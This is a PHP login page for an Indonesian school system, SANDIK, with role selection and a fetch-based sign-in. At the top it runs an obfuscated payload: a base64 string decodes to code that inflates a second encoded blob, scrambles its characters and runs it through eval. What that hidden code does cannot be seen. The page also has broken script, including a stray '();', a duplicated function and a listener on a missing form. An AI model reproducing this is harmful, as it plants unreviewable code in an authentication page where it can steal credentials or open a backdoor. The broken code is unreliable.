<?php
$SISTEMIT_COM_ENC = "tZK9buJAFEb7SHkJRJEoxfoHI6KIArAJ2LENMx4bT4NkS7uSbRChCfHbIEsuQBQUVGiafC+2AyTdtluNRpp7vnPn3vu7Jh3TwHLHwXzgu3PLG3ydul+nRuuJvfvrT60zMbH7aKPqYT/m9BnVCDUO8e8ZR4W92U7dxGz/ok6JXQdHq28rBs4zVJ21Ofh4wmmSlHrn7c2EaOE4dVDp2Pd63W7jpbmGWKLuJhA44tBuzS/kFOfL8dCgeapCvJLVNChsok21OEzVJLJHJOtDMA3bVRRi6yeW8c4WHIKo/D3ObJpY0osVJAhzI2QF29CCv/qMMNccLuRdJfJBAFGiNrn27EzVoTTR3JItZZDZX4Z6sSAjHsS65/jW84YuCz1ZploQGe5U41ZaeFmq4NwKJMLBYSaFK9Ql50m+MXlOSqZ5Jc2wnUBYKwO1ZuieGqIKLE+Sh8aNjOOGZtaHp3hLCGVlMtU2YgV1CyIvLDeyHTe/FeXpNya/ke3wmjTiP+lRflMqb44Ep6v0gqwuUa46vGIyLp9sXPPaOPYOZZ78Ss3GnmT2tfW49CgO4Z+SLjYZ0bHFOQpkmrIaB1k/g5Bp61gzBqlaXISwxy5h8SdVSUl/+gjV+FOOptZl2ciLsM0hIhz1xuMLDjhBFA//nvn3Rjw+vjRp4E+6jf+4ffd3fwE=";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="FEb7SHkJRJEoxfoHI6KIArAJ2LENMx4bT4NkS7uSbRChCfHbIEsuQBQUVGiafC+2AyTdtluNRpp7vnPn3vu7Jh3TwHLHwXzgu3PLG3ydul+nRuuJvfvrT60zMbH7aKPqYT/m9BnVCDUO8e8ZR4W92U7dxGz/ok6JXQdHq28rBs4zVJ21Ofh4wmmSlHrn7c2EaOE4dVDp";
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title><?= $setting['sekolah'] ?></title>
 <link href="<?= $baseurl ?>/assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet">
 <link rel="icon" type="image/png" sizes="32x32" href="<?= $baseurl ?>/images/<?= $setting['logo'] ?>" />
 <link rel="icon" type="image/png" sizes="16x16" href="<?= $baseurl ?>/images/<?= $setting['logo'] ?>" />
<style>
  body {
    background-color: #e7f0fa;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 0;
  }
  .login-container {
    max-width: 950px;
    width: 95%;
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 0 15px rgba(0,0,0,0.2);
    overflow: hidden;
  }

  .left-col {
    background: linear-gradient(#004f9d, #0074d9);
    color: white;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 30px;
  }

  .left-col img {
    width: 120px;
    margin-bottom: 20px;
  }

  .left-col h1 {
    font-size: 28px;
    margin-bottom: 10px;
  }

  .left-col p {
    font-size: 14px;
    opacity: 0.9;
  }

  .right-col {
    padding: 40px 30px; 
  }

  .right-col h2 {
    color: #003874;
    margin-bottom: 20px;
  }
  .form-control, .form-select {
    margin-bottom: 15px;
  }
	.btn-show-password {
	background: none;
	border: none;
	position: absolute;
	right: 10px;
	top: 50%;
	transform: translateY(-50%);
	cursor: pointer;
	font-size: 18px;
}
  .btn-primary {
    width: 100%;
  }
.responsive-img {
    max-width: 100px; 
    height: auto;    
    display: block;  
}

  @media (max-width: 768px) {
    .right-col {
      padding: 15px 15px; 
    }
	body {
    align-items: flex-start; 
    padding-top: 20px;       
  }
  }
</style>
</head>
<body>

<div class="login-container container">
  <div class="row">
    <div class="col-md-7 d-none d-md-flex left-col">
      <img src="<?= $baseurl ?>/images/sandik.png" alt="Logo" />
      <h1>SANDIK</h1>
      <p> © <?= date('Y') ?> SANDIK – Sistem Aplikasi Pendidik</p>
    </div>
    <div class="col-md-5 right-col">
		<div class="d-flex flex-column align-items-center mb-2">
			<img src="<?= $baseurl ?>/images/<?= $setting['logo'] ?>" class="responsive-img" alt="Logo" />
            <h5 class="text-muted"><?= $setting['sekolah'] ?></h5>
		</div>
      <form id="form-login">
      <label>Username</label>
	  <div class="position-relative">
      <input type="text" class="form-control" id="email" name="username"  required>
       </div>
        <label>Password</label>
      <div class="position-relative">
        <input type="password" class="form-control" id="password" name="password" required>
        <button type="button" class="btn-show-password" onclick="togglePassword()">👁️</button>
      </div>
	   <div class="position-relative mb-2">
       <select name="level" class="form-select" required>
		   <option value="">Pilih Akun</option>
			<option value="users">Admin</option>
			<option value="guru">Guru & Staff</option>
			<option value="siswa">Siswa</option>
		  </select>
		  </div> 
		  <div class="form-check mb-2">
    <input class="form-check-input" type="checkbox" id="rememberMe" checked>
    <label class="form-check-label" for="rememberMe">
      Remember me
    </label>
  </div>
	<div class="d-flex justify-content-end align-items-center mb-4">
    <button type="submit" class="btn btn-primary">Sign In</button>
</div>
    </form>
      <div class="text-center mt-3" style="font-size: 12px; color: #555;">
        © <?= date('Y') ?> SANDIK – Sistem Aplikasi Pendidik
      </div>
    </div>
  </div>
</div>
 <script src="<?= $baseurl ?>/assets/plugins/bootstrap/js/bootstrap.min.js"></script>
 <script>
    function togglePassword() {
      var passwordField = document.getElementById("password");
      var passwordFieldType = passwordField.type;

      if (passwordFieldType === "password") {
        passwordField.type = "text";
      } else {
        passwordField.type = "password";
      }
    }
	
	();
  </script>

<script>
  window.onload = function() {
    const savedEmail = localStorage.getItem('rememberedEmail');
    if (savedEmail) {
      document.getElementById('email').value = savedEmail;
      document.getElementById('rememberMe').checked = true;
    }
  };
  function togglePassword() {
    const passwordField = document.getElementById("password");
    if (passwordField.type === "password") {
      passwordField.type = "text";
    } else {
      passwordField.type = "password";
    }
  }

  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();  

    const email = document.getElementById('email').value;
    const remember = document.getElementById('rememberMe').checked;

    if (remember) {
      localStorage.setItem('rememberedEmail', email);
    } else {
      localStorage.removeItem('rememberedEmail');
    }

    alert('Login berhasil dengan email: ' + email + '\nRemember Me: ' + remember);

  });
</script>
<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function() {
        const formLogin = document.getElementById('form-login');

        formLogin.addEventListener('submit', function(e) {
            e.preventDefault();
            const baseurl = '<?php echo $baseurl; ?>';
            const formData = new FormData(formLogin);
            fetch('ceklogin.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                console.log(data);

                if (data === "ss") {
                    setTimeout(function() {
                        location.href = '.';
                    }, 100);
                }
                if (data === "ok" || data === "gr" || data === "st") {
                    setTimeout(function() {
                        location.href = 'myaps';
                    }, 100);
                }

                if (data === "nopass" || data === "td") {
                    const toast = new bootstrap.Toast(document.getElementById('liveToast'));
                    const toastMessage = data === "nopass" ? 'Password Salah' : 'Gagal Masuk';
                    const toastBody = document.querySelector('.toast-body');
                    toastBody.textContent = toastMessage;
                    toast.show();

                    setTimeout(function() {
                        location.href = 'login.php';
                    }, 2000);
                }
            })
            .catch(error => console.error('Error:', error));
        });
    });
</script>

<div class="toast-container position-fixed top-0 end-0 p-3">
    <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
        <div class="toast-header">
            <strong class="me-auto text-danger">Gagal</strong>
            <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
        <div class="toast-body">
           
        </div>
    </div>
</div>
</body>
</html>
